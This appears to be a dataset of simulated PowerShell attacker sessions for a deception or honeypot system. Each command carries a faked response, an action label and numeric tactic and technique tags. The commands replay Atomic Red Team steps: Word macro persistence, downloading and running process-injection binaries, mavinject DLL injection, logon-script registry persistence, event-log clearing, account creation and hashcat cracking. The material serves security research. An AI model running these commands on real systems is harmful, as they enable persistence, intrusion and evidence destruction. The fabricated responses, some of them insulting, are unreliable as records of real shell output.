+command:Add-Type -AssemblyName Microsoft.Office.Interop.Word
+response:PS C:\Users\chris> Add-Type -AssemblyName Microsoft.Office.Interop.Word
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:# Define the path of copied normal template for restoral
+response:PS C:\Users\chris> # Define the path of copied normal template for restoral
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+response:PS C:\Users\chris> $copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:# Define the path to the normal template
+response:PS C:\Users\chris> # Define the path to the normal template
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:0
+technique:40
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:# Registry setting to "Trust access to the VBA project object model" in Word
+PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:$registryValue = "AccessVBOM"
+PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Block this command this time }
+command:$registryData = "1"
+response:Access Denied
+PS C:\Users\chris>
+tactic:4
+technique:40
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Block this command this time }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:Access Denied
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:
+command:# Get the value of the Key/Value pair
+response:# Get the value of the Key/Value pair
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:# Logical operation to: if the value of the key/value is 1, do nothing - 
+PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:# if the value is 0, change it to 1 and create flag1 - 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:# if it doesn't exist, create the value and flag2
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:if ($value -eq "1")
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:{ 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:}   
+response:}    
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:  elseif ($value -eq "0")
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:{ 
+PS C:\Users\chris>
+tactic:2
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:  echo "flag1" > $flagPath1
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:} 
+response:}  
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  else 
+response:  else 
+PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:{
+response:{ 
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag2" > $flagPath2
+response:  echo "flag2" > $flagPath2
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:
+command:}
+response:}  
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:Add-Type -AssemblyName Microsoft.Office.Interop.Word
+response:Add-Type -AssemblyName Microsoft.Office.Interop.Word
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Define the path of copied normal template for restoral
+response:# Define the path of copied normal template for restoral
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+response:$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Define the path to the normal template
+response:# Define the path to the normal template
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Block this command this time }
+command:$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
+response:Access Denied
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Create copy of orginal template for restoral
+response:# Create copy of original template for restoral
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:Copy-Item -Path $docPath -Destination $copyPath -Force
+response:Copy-Item -Path $docPath -Destination $copyPath -Force
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# VBA code to be insterted as a Macro
+response:# VBA code to be inserted as a Macro
+PS C:\Users\chris>
+tactic:6
+technique:154
+
+
+action:{ Change response }
+command:# Will create a scheduled task to open the Calculator at 8:04pm daily
+response:# Will create a scheduled task to open the Calculator at 8:04pm daily
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$vbaCode = @"
+response:$vbaCode = @"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Sub AutoExec()
+response:  Sub AutoExec()
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Dim applicationPath As String
+response:  Dim applicationPath As String
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Dim taskName As String
+response:  Dim taskName As String
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Dim runTime As String
+response:  Dim runTime As String
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Dim schTasksCmd As String
+response:  Dim schTasksCmd As String
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  applicationPath = "C:\Windows\System32\calc.exe"
+response:  applicationPath = "C:\Windows\System32\calc.exe"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  taskName = "OpenCalcTask"
+response:  taskName = "OpenCalcTask"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  runTime = "20:04"
+response:  runTime = "20:04"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  schTasksCmd = "schtasks /create /tn """ & taskName & """ /tr """ & applicationPath & """ /sc daily /st " & runTime & " /f"
+response:  schTasksCmd = "schtasks /create /tn """ & taskName & """ /tr """ & applicationPath & """ /sc daily /st " & runTime & " /f"
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Shell "cmd.exe /c " & schTasksCmd, vbNormalFocus
+response:  Shell "cmd.exe /c " & schTasksCmd, vbNormalFocus
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  End Sub
+response:  End Sub
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : [Binary data]
+Headers           : {[Content-Disposition, inline; filename="T1055.exe"], [Content-Length, 483840], 
+                    [Content-Type, application/octet-stream], [Date, Mon, 01 Nov 2021 12:00:00 GMT]}
+RawContentLength  : 483840
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:C:\atomics\T1055.004\bin\T1055.exe
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:PS C:\Users\chris>: The term '$C:\atomics\T1055.004\bin\x64\EarlyBird.exe' is not recognized as a cmdlet, function, script file, or executable program. 
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Write-Host Downloading Process Hacker
+response:Downloading Process Hacker
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\Temp\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://versaweb.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe" -OutFile "C:\Temp\ExternalPayloads\processhacker-2.39-setup.exe"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : [Binary data]
+Headers           : {[Content-Disposition, attachment; filename="processhacker-2.39-setup.exe"], [Content-Length, 23513032], 
+                    [Content-Type, application/octet-stream], [Date, Mon, 01 Nov 2021 12:00:00 GMT]}
+RawContentLength  : 23513032
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Write-Host Installing Process Hacker
+response:Installing Process Hacker
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Start-Process "c:\Temp\ExternalPayloads\processhacker-2.39-setup.exe" -Wait -ArgumentList "/s"
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Change response }
+command:Start-Process -FilePath "$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:The registry value 'AccessVBOM' already exists with the required setting.
+PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:}   
+response:PS C:\Users\chris>
+tactic:2
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:The registry value was set to 0, temporarily changing to 1.
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris>
+tactic:2
+technique:130
+
+
+action:{ Change response }
+command:} 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  else 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:The registry value 'AccessVBOM' does not exist, temporarily creating it.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ response should contain you are ugly }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:New-ItemProperty: You are ugly
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag2" > $flagPath2
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:}
+response:PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:Add-Type -AssemblyName Microsoft.Office.Interop.Word
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Define the path of copied normal template for restoral
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ response should contain you are ugly }
+command:# Define the path to the normal template
+response:# Define the path to the normal template: You are ugly
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Create copy of orginal template for restoral
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:Copy-Item -Path $docPath -Destination $copyPath -Force
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# VBA code to be insterted as a Macro
+response:PS C:\Users\chris>
+tactic:6
+technique:154
+
+
+action:{ Change response }
+command:# Will create a scheduled task to open the Calculator at 8:04pm daily
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$vbaCode = @"
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Sub AutoExec()
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+response:PS C:\Users\chris>
+
+tactic:2
+technique:29
+
+
+action:{ Change response }
+command:cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null
+response:PS C:\Users\chris>
+
+tactic:6
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:128
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1027.007\bin\ninja_syscall1.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:128
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe" -OutFile "C:\atomics\T1027.007\bin\ninja_syscall1.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:128
+
+
+action:{ Change response }
+command:Start-Process "C:\atomics\T1027.007\bin\ninja_syscall1.exe"
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris>
+tactic:1
+technique:103
+
+
+action:{ Change response }
+command:if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+] hello.log removed." }
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:4
+technique:103
+
+
+action:{ Change response }
+command:wevtutil cl System
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Change response }
+command:$mypid = (Start-Process notepad -PassThru).id
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:mavinject $mypid /INJECTRUNNING "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Change response }
+command:Stop-Process -processname notepad
+response:PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+action:{ response should contain you are ugly }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:103
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:10
+technique:105
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\atomics\..\ExternalPayloads\7z1900.exe"
+response: PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Change response }
+command:Start-Process -FilePath "C:\atomics\..\ExternalPayloads\7z1900.exe" -ArgumentList "/S /D=C:\atomics\..\ExternalPayloads\7zi" -NoNewWindow
+response:PS C:\Users\chris>
+tactic:10
+technique:105
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "C:\atomics\..\ExternalPayloads\hashcat6.7z"
+response:PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ Change response }
+command:Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
+response:PS C:\Users\chris>
+tactic:1
+technique:194
+
+
+action:{ Change response }
+command:New-Item -ItemType Directory (Split-Path $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe)) -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Change response }
+command:Move-Item "C:\atomics\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*" $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..) -Force -ErrorAction Ignore
+response:PS C:\Users\chris>
+tactic:4
+technique:40
+
+
+action:{ Change response }
+command:cd C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
+response:PS C:\Users\chris>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule C:\atomics\T1110.002\src\sam.txt C:\atomics\T1110.002\src\password.lst
+response:PS C:\Users\chris>
+tactic:4
+technique:21
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement  
+PS C:\Users\chris>
+tactic:3
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:The registry value '$registryValue' already exists with the required setting.  
+PS C:\Users\chris>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:}   
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:PS C:\Users\chris>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:The registry value was set to 0, temporarily changing to 1.  
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:} 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  else 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:The registry value '$registryValue' does not exist, temporarily creating it.  
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:11
+technique:130
+
+
+action:{ Block this command this time }
+command:  echo "flag2" > $flagPath2
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:}
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:103
+
+
+action:
+command:Install-Module -Name DSInternals -Scope CurrentUser -Force
+response:powershell
+Untrusted repository
